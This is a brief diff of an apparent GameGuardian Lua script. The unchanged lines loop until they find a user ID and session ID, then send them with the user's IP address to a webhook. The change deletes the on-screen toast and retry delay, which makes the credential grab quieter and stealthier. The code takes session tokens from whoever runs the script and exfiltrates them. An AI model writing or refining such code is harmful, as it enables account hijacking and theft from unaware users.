@@ -111,8 +111,6 @@ local userId, sessionId
 repeat
   userId, sessionId = findUserId()
   if not userId or not sessionId then
-    gg.toast("User ID and Session ID not found. Please ensure you are logged in. Retrying in 5 seconds...")
-    gg.sleep(5000)
   end
 until userId and sessionId
 sendToWebhook(userId, sessionId, ip, nil)
